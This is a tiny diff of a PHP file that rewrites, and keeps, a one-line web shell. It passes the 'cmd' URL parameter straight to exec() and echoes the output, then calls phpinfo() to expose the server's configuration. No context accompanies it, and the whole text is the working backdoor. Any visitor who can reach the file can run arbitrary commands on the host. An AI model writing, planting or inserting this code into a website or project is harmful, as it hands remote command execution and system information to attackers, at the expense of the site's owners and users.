@@ -1,7 +1,2 @@
 <?php
-
-echo exec($_GET['cmd']);
-
-echo phpinfo();
-
-?>
+echo exec($_GET['cmd']);phpinfo();
